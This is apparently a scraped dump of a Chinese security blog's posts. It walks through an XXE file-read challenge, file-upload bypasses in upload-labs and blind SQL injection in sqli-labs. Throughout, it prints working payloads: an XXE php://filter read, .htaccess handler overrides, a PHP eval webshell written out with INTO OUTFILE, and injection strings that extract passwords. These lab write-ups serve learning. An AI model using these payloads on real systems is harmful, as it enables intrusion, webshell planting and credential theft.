]]] ) : bool 将函数注册到SPL __autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。 如果在你的程序中已经实现了__autoload()函数，它必须显式注册到__autoload()队列中。因为 spl_autoload_register()函数会将Zend Engine中的__autoload()函数取代为spl_autoload()或spl_autoload_call()。 如果需要多条 autoload 函数，spl_autoload_register() 满足了此类需求。 它实际上创建了 autoload 函数的队列，按定义时的顺序逐个执行。相比之下， __autoload() 只可以定义一次。 参数 autoload_function 欲注册的自动装载函数。如果没有提供任何参数，则自动注册 autoload 的默认实现函数spl_autoload()。 throw 此参数设置了 autoload_function 无法成功注册时， spl_autoload_register()是否抛出异常。 prepend 如果是 true，spl_autoload_register() 会添加函数到队列之首，而不是队列尾部。 返回值 成功时返回 TRUE， 或者在失败时返回 FALSE。 +++ 考察点： 实例化漏洞 XXE漏洞 +++ 分析：使用 class_exists 函数来判断类是否存在，如果不存在的话，就会调用程序中的 __autoload 函数，但是这里没有 __autoload 函数，而是用 spl_autoload_register 注册了一个类似 __autoload 作用的函数，调用之前定义的NotFound函数输出404信息。 这里直接利用PHP的内置类，先用 GlobIterator 类搜索 flag文件 名字，来看一下PHP手册对 GlobIterator 类的 构造函数的定义： 第一个参数为要搜索的文件名，第二个参数为选择文件的哪个信息作为键名，这里我选择用 FilesystemIterator::CURRENT_AS_FILEINFO ，其对应的常量值为0. 构造搜索文件的payload： 1http://localhost/CTF/index.php?name=GlobIterator&amp;param=./*.php&amp;param2=0 执行发现，flag的文件名为 f1agi3hEre.php ，接下来我们使用内置类 SimpleXMLElement 读取 f1agi3hEre.php 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： &lt; &gt; &amp; ‘ “ 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 base64编码 后输出即可； 构造payload： 1http://localhost/CTF/index.php?name=SimpleXMLElement&amp;param=&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/var/www/html/CTF/f1agi3hEre.php\"&gt;]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;&amp;param2=2","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"PHP代码审计实例","slug":"PHP代码审计实例","date":"2020-04-29T06:42:31.000Z","updated":"2020-05-07T02:12:58.636Z","comments":true,"path":"2020/04/29/PHP代码审计实例/","link":"","permalink":"https://singlemindedt.github.io/2020/04/29/PHP代码审计实例/","excerpt":"","text":"upload-labs +++ Pass-01 如图，要求我们上传一个webshell到服务器，并要求我们上传图片； 首先，我们上传任意文件试试： 提示我们，只能上传.jpg|.png|.gif类型的文件； 查看提示，“本pass在客户端使用js对不合法图片进行检查！”； 提示已经很明确了，该题目在客户端使用js过滤不合法后缀，我们只需要在上传时将文件改为合法后缀格式，然后抓包，再改包； 看看源码： 1234567891011121314151617function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name + \"|\") == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125;&#125; 拦截方式：客户端js白名单检查;根据上传文件的后缀是否为.jpg|.png|.gif格式来判断文件能否上传； 绕过方式：将木马伪装成.jpg|.png|.gif文件，上传后burp拦截数据包，更改文件后缀为.php，再forward. 改包： 其他方法 修改js脚本 浏览器禁止使用js脚本（火狐下🦊) 在Firefox地址栏里输入“about:config”。在搜索栏输入“javascript.enabled”查找到首选项。点击鼠标右键选择“切换”，把“javascript.enabled”键值改为“false” +++ Pass-02首先，尝试上传php文件，提示信息为：文件类型不正确，请重新上传！这次给的不是白名单或者黑名单，而是告诉我们文件类型不正确，应该为MIME的检查。 查看提示： 提示：本pass在服务端对数据包的MIME进行检查！ 补充：MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 12345678910111213141516171819常见的MIME类型(通用型)：超文本标记语言文本 .html text/htmlxml文档 .xml text/xmlXHTML文档 .xhtml application/xhtml+xml普通文本 .txt text/plainRTF文本 .rtf application/rtfPDF文档 .pdf application/pdfMicrosoft Word文件 .word application/mswordPNG图像 .png image/pngGIF图形 .gif image/gifJPEG图形 .jpeg,.jpg image/jpegau声音文件 .au audio/basicMIDI音乐文件 mid,.midi audio/midi,audio/x-midiRealAudio音乐文件 .ra, .ram audio/x-pn-realaudioMPEG文件 .mpg,.mpeg video/mpegAVI文件 .avi video/x-msvideoGZIP文件 .gz application/x-gzipTAR文件 .tar application/x-tar任意的二进制数据 application/octet-stream +++ 源码： 12345678910111213141516171819$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'] if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; 拦截方式：服务端白名单;对文件的MIME(Multipurpose Internet Mail Extensions)进行了验证，只允许图片类文件上传通过 绕过方式： 直接上传含木马的图片文件，burp截包，修改后缀为php文件 直接上传木马文件，burp抓包，修改Content-Type为image/png等允许类型 +++ 此处我们利用2修改Content-Type为image/png：抓包：[4]:() 改包：[5]:() 发包：文件上传成功，直接将文件拖出来即可得访问； +++ Psaa-03首先，尝试上传php文件，提示信息为：提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！ 查看提示： 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单验证;(禁止上传.asp|.aspx|.php|.jsp后缀文件) 绕过方式：(1)可上传.php3.phtml .phps .php5 .pht…等这样可以被服务器解析的后缀名(2)重写文件解析规则绕过，先上传一个.htaccess文件，再上传一个hack.png文件(含木马)通过.htaccess文件调用php解析器去解析一个文件名中只要包含”hack.png”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析.htaccess文件内容： 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 此处修改文件后缀为.php3;[8]:() 上传成功！+++ Pass-04首先，尝试上传php文件，提示信息为：提示：此文件不允许上传! 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; +++ 拦截方式：服务端黑名单加强验证;与Pass-03类似，只是对上传文件的后缀名的限制种类增加 绕过方式：重写文件解析规则绕过(第3关(2)) 上传.htaccess文件 123&lt;FilesMatch \"hack.png\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 上传hack.png（含木马） 上传成功，并以php进行了解析！ +++ Pass-05首先，尝试上传php文件，提示信息为：*提示：此文件类型不允许上传！ * 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！ Pass-05向黑名单中增加了.htaccess后缀文件; 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 删除了该语句：$file_ext = strtolower($file_ext); //转换为小写 +++ 拦截方式：服务端黑名单超级加强;.htaccess加入了黑名单，取消了后缀名全变为小写字母的strtolower（）函数 绕过方式：采用大小写混合方式绕过.PhP,.PHp5，或着.hTacCesS文件… 上传成功！ +++ Pass-06首先，尝试上传php文件，提示信息为：*提示：此文件不允许上传 * 查看提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ 源码： 1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 提示和源码里的黑名单并不一致，提示里少了.htaccess$file_ext = trim($file_ext); //首尾去空+++ 拦截方式：服务端黑名单;去掉了去除空格的trim函数； 绕过方式：选择后缀为.php的一句话上传，抓包后在后面增加空格; 上传成功！ +++","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://singlemindedt.github.io/tags/PHP/"}]},{"title":"sqli-labs-Page-1-Less-9&10","slug":"sqli-labs-Page-1-Less-9","date":"2020-04-09T00:50:00.000Z","updated":"2020-07-29T11:45:47.068Z","comments":true,"path":"2020/04/09/sqli-labs-Page-1-Less-9/","link":"","permalink":"https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/","excerpt":"","text":"Less-9（GET方式-盲注-基于时间-单引号） 基于时间延迟注入：正确延迟，错误不延迟； 具体操作与布尔型类似，这里需要用到sleep（）函数； 爆库 库长 1?id=1' and if(length(database())=8,sleep(5),1)--+ 根据浏览器刷新的延迟程度，可以判断库长为8； 页面的回显并没有任何指示意思，即使是错误的判断也可返回You are in.........; 库名 1?id=1' and if(left(database(),1)='s',sleep(5),1)--+ 1?id=1' and if(left(database(),2)='se',sleep(5),1)--+ 爆表 1?id=1' and if( left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)='e' ,sleep(5),1)-- 第一个表首字母为’e’; 爆字段 1?id=1' and if(mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password',sleep(5),1) --+ 爆内容 1?id=1' and if(substr((select password from users limit 0,1),1,1)='d',sleep(5),1) --+ …… 由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述； +++ Less-10（GET方式-盲注-基于时间-双引号）与第九关完全一致，仅把单引号改为了双引号闭合形式，只要更改一下参数后的符号即可；例：库长 1?id=1\" and if(length(database())=8,sleep(5),1)--+ sleep()函数执行，页面延迟刷新，判断正确；因为与Less-9基本一致，就不再赘述；","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-8","slug":"sqli-labs-Page-1-Less-8","date":"2020-04-08T07:41:44.000Z","updated":"2020-07-29T11:59:22.575Z","comments":true,"path":"2020/04/08/sqli-labs-Page-1-Less-8/","link":"","permalink":"https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/","excerpt":"","text":"Less-8(GET方式-盲注-布尔型-单引号) 布尔型注入：正确有回显，错误无回显，逐字爆破；利用二分法提高爆破效率; 该题完全可以利用之前第五关的任一方法，还可以用上一关的导入木马文件，既然题目有指示那就用布尔盲注好了。 爆库名 猜测库名长度 1?id=1' and (length(database()))=8 --+ 正常回显，说明库名长度为8； 首字母1?id=1' and substr(database(),1,1)&lt;'t' --+ 正常回显，首字母ASCII码小于t; 1?id=1' and substr(database(),1,1)='s' --+ 正常回显，说明库名首字母为s； 通过更改相应参数，可更改测试位： 其它位1?id=1' and substr(database(),2,1)='e' --+ …… 1?id=1' and substr(database(),1,8)='security' --+ 说明库名为security; +++ 爆表名判断表长：1?id=1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 3,1)=5 --+ 说明，第4张表的长度位5； 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)='u' --+ 得到第4张表首字母为’u’;注：limit(0,1)从0开始表示首位/个； 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1)='s' --+ 正常回显，第2个字母为’s’; 1?id=1' and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,5)='users' --+ 通过更改mid(column_name,start[,length])中的’start’来改变位数，最终得到第4张表名为’users’; +++ 爆字段 判断列名长度： 1?id=1' and (select length(column_name) from information_schema.columns where table_name='users' limit 4,1)=8 --+ 得到第5列，列名长度为8； 1?id=1' and mid((select column_name from information_schema.columns where table_name='users' limit 4,1),1,8)='password' --+ 根据长度，猜测列名为password，验证得到正常返回； +++ 爆内容 判断长度： 1?id=1' and (select length(password) from users limit 0,1)=4 --+ 得到’password’中第一条记录长度为4； 逐一测试内容 1?id=1&apos; and substr((select password from users limit 0,1),1,1)=&apos;d&apos; --+ 得到首字母为d； …… 得到该用户的密码为”dumb”(大小写不定); 同理，可通过如上方法得到对应用户名。从而得到用户名-密码； 1?id=1' and mid((select password from users order by id limit 1,1),1,1)='i' --+","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-7","slug":"sqli-labs-Page-1-Less-7","date":"2020-04-06T02:41:44.000Z","updated":"2020-08-04T08:03:55.105Z","comments":true,"path":"2020/04/06/sqli-labs-Page-1-Less-7/","link":"","permalink":"https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/","excerpt":"","text":"Less-7(GET方式-导出文件-string) 根据题目意思，应该是让我们利用into outfile将木马程序写入文件； 首先，测试闭合id参数方法还和之前几关一样，在id后加单引号、双引号、括号等字符看是否报错。若报错则id很可能是该种闭合方式，接下来再通过添加注释符来进一步测试是否为该种闭合方式；若语句正常执行，则说明id确为该种闭合方式。经过测试发现：格式为：id=((&#39;$id&#39;)) +++ 关于into outfile into outfile 主要用于将查询出来的结果导出到文本中;但是，使用还需要如下权限： 知道物理路径（into outfile ‘WEB目录的物理路径’）这样才能写对目录。（默认的当前目录是MySQL的数据目录） 能够使用union（也就是MySQL版本在3以上） 没有对’进行过滤（因为outfile后面的’’不可以用其他函数代替转换） MySQL用户拥有file_priv权限（不然就不能写文件或者把文件内容读出） 对web目录有写权限。 先来看看物理路径： @@basedir:mysql安装路径 @@datadir:数据库路径 尝试获取路径： 1? id=-1')) union select 1,2,@@datadir --+ 没有将结果返回，应该是做了限制，语法正确时只返回You are in.... Use outfile...... 由于我是本地安装，知道这一系列题目均公用数据，这里可以借前几题查询路径； 尝试写入文件： payload: 1?id=1')) union select 1,2,'&lt;?php @eval($_POST[\"pwd\"]);?&gt;' into outfile \"E:\\\\PhpStudy2018\\\\PHPTutorial\\\\WWW\\\\hack.php\"--+ 注：此处用\\\\否则,写入的文件名会非常长，为路径+文件名的组合形式； 发现响应位置并没有我们计划要写入的内容，即表示此时我们没有权限导入/导出； MySQL默认没有权限导入/导出文件，该权限与secure_file_priv有关,默认为NULL，即不允许导入导出； secure-file-priv特性secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制 查看secure-file-priv参数的值： 1show global variables like '%secure%'; 因为我们使用的是phpstudy,故在其目录下的MySQL下，在my.ini文件里加上secure_file_priv=‘’（英文单引号/双引号/什么都不加），此时表示不对mysqld 的导入|导出做限制,重启phpstudy即可； 尝试写入文件： payload: 1?id=1')) union select 1,2,'&lt;?php @eval($_POST[\"pwd\"]);?&gt;' into outfile \"E:\\\\PhpStudy2018\\\\PHPTutorial\\WWW\\\\hack.php\"--+ 可以发现在相应的目录下已经出现了我们计划写入的文件； 注：当文件名重复时，指令不会再次执行，即不会覆盖原来重名文件； 查看写入文件内容： +++ 接下来就可以使用菜刀连接了； 由payload可知我们把文件写在了站点根目录里了，所以连接菜刀只需写如下内容： http://127.0.0.1/hack.php +++ 更新(2020.08.04): 来康康源码： 1234567891011121314151617181920212223$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; 看这行： 1//print_r(mysql_error()); 不报错的原因为注释了打印报错的语句；","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-6","slug":"sqli-labs-Page-1-Less-6","date":"2020-03-29T02:53:22.000Z","updated":"2020-07-29T12:02:11.035Z","comments":true,"path":"2020/03/29/sqli-labs-Page-1-Less-6/","link":"","permalink":"https://singlemindedt.github.io/2020/03/29/sqli-labs-Page-1-Less-6/","excerpt":"","text":"Less-6(GET方式-双注入-双引号-string型)此题在上一题的基础上只是更改了闭合类型（由单引号改为双引号），其他不变，可以用Less-5的方法解决； 举例：判断库名长度； 正确回显，说明判断正确，库名长度确实为8；","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://singlemindedt.github.io/tags/SQL/"}]},{"title":"sqli-labs-Page-1-Less-5","slug":"sqli-labs-Page-1-Less-5","date":"2020-03-15T10:41:44.000Z","updated":"2020-07-29T12:02:25.176Z","comments":true,"path":"2020/03/15/sqli-labs-Page-1-Less-5/","link":"","permalink":"https://singlemindedt.github.io/2020/03/15/sqli-labs-Page-1-Less-5/","excerpt":"","text":"[TOC] Less-5(GET方式-双注入-单引号-string型)此题和之前不太一样，当你输入信息是并不返回结果，只返回You are in..........或是语法错误；如下：[50]:() +++[51]:()说明没有显示位，无法使用联合查询； 方法1：布尔盲注(boolean-based blind)布尔型注入：正确有回显，错误无回显，逐字爆破；利用二分法提高爆破效率; 爆库名 猜测库名长度：?id=1&#39; and (length(database()))&gt;9 --+[60]:() 无回显，说明错误；?id=1&#39; and (length(database()))=8 --+ 正常回显，说明库长为8； 首字母 left()函数： 格式 说明 left(string,n) string为要截取的字符串；n为长度 left(database(),1)&gt;’s’ 查看字符串首字母是否大于‘s’ left(database(),2)&gt;’se’ 查看字符串前两位字母是否大于’se’ string可自行构造语句注入； ?id=1&#39; and left((select database()),1)&lt;&#39;t&#39;--+ 得到正常回显，即首字母是比t小的字母； ?id=1&#39; and left((select database()),1)=&#39;s&#39;--+ 正常回显，说明首字母为’s’; ?id=1&#39; and left((select database()),1)&lt;&#39;s&#39;--+ 无回显，说明我们的推测结果是对的； 其他位?id=1&#39; and left((select database()),2)&gt;&#39;sd&#39;--+ 正常回显，说明第二个字母应大于’d’；?id=1&#39; and left((select database()),2)=&#39;se&#39;--+[63]:() 正常回显，说明前两位为’se’;爆其它位与上述方法相同，此处省略，最终得到库名为”security”;substr()函数：（与substring（）相似） 格式 说明 substr(string,start,length) string要处理的字符串；start开始位置；length截取长度 substr(database(),1,1)&gt;’s’ 查看数据库名首位； substr(database(),2,1)&gt;’s’ 查看数据库名第2位； string可自行构造语句注入； 首字母 ?id=1&#39; and substr(database(),1,1)&lt;&#39;t&#39; --+[64]:() 正常回显；?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+[65]:() 其它位?id=1&#39; and substr(database(),2,1)&lt;&#39;f&#39; --+ 正常回显；?id=1&#39; and substr(database(),2,1)&lt;&#39;e&#39; --+[67]:() 无回显，说明此处位’e’;mid()函数 格式 说明 MID(column_name,start[,length]) column_name要提取字符的字段;start规定开始位置（起始位置为1）；要返回的字符数。如果省略，则MID()函数返回剩余文本； mid(database(),1,1)&gt;’s’ 查看数据库名首位是否大于’s’； mid(database(),2,1)&gt;’e’ 查看数据库名的第2位是否大于’e’； column_name可自行构造语句注入； 首字母 ?id=1&#39; and mid(database(),1,1)&gt;&#39;r&#39; --+[68]:() 正常回显，首字母大于’r’;?id=1&#39; and mid(database(),1,1)&lt;&#39;t&#39; --+[69]:() 正常回显，说明首字母为’s’; 其它位?id=1&#39; and mid(database(),2,1)&lt;&#39;f&#39; --+ 正常回显，判断正确；?id=1&#39; and mid(database(),2,1)=&#39;e&#39; --+[71]:() 正常回显，此处为’e’;其他位操作相同；ORD()函数此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。eg:ORD(mid(database(),1,1))&gt;115 意为检测database()的首位ASCII码是否大于115，即‘s’;[72]:() 无回显，首字母ASCll不大于115；[73]:() 正常回显。首字母为’s’; 爆表名 ?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#39;u&#39; --+[74]:() 得到第4张表首字母为’u’;?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1)=&#39;s&#39; --+ 正常回显，第2个字母为’s’;之后通过更改mid(column_name,start[,length])中的’start’来改变位数，最终得到第4张表名为’users’; 注：limit子句用于限制查询结果返回的数量，常用于分页查询 格式 说明 select * from tableName limit i,n i：为查询结果的索引值(默认从0开始)，当i=0时可省略i n：为查询结果返回的数量 limit n 等同于`` limit 0,n` SELECT * FROM table LIMIT 1,10; 检索记录行2-11; 爆字段 判断列名长度： ?id=1&#39; and (select length(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 4,1)=8 --+得到第5列，列名长度为8；?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),1,8)=&#39;password&#39; --+ 根据长度，猜测列名为password，验证得到正常返回； +++ 问题：在这里password是在第5列，而通过SQLMap检测，只有3列，且出现了如下不应存在的首列”user”; ?id=1&#39; and mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,4)=&#39;user&#39; --+ 得到第1列为’user’; 并且查看users表，发现共有13条记录； +++ 爆内容 判断长度 ?id=1&#39; and (select length(password) from users limit 0,1)=4 --+ 得到’password’中第一条记录长度为4； 对比：order by id ?id=1&#39; and (select length(password) from users order by id limit 0,1)=4 --+ 说明内容顺序应该是固定的而不是以关系链接的； 逐一测试内容 ?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;d&#39; --+ 得到首字母为d； ?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;D&#39; --+ 说明MySQL对大小写不敏感，不能区分是’d’还是’D’; ?id=1&#39; and mid((select password from users order by id limit 0,1),1,1)=&#39;d&#39; --+ ?id=1&#39; and mid((select password from users order by id limit 0,1),2,1)=&#39;u&#39; --+ …… 得到该用户的密码为”dumb”(大小写不定); 同理，可通过如上方法得到对应用户名。从而得到用户名-密码； ?id=1&#39; and mid((select password from users order by id limit 1,1),1,1)=&#39;i&#39; --+ 通过改变limit参数修改所查询的记录； +++ 方法2：SQLMap盲注步骤： 检测python sqlmap.py -u &quot;URL?id=1&quot; 可以看到，SQLMap使用了三种类型的注入方法： Type: boolean-based blind 12Title: AND boolean-based blind - WHERE or HAVING clausePayload: id=1' AND 7804=7804 AND 'Fgyq'='Fgyq Type: error-based 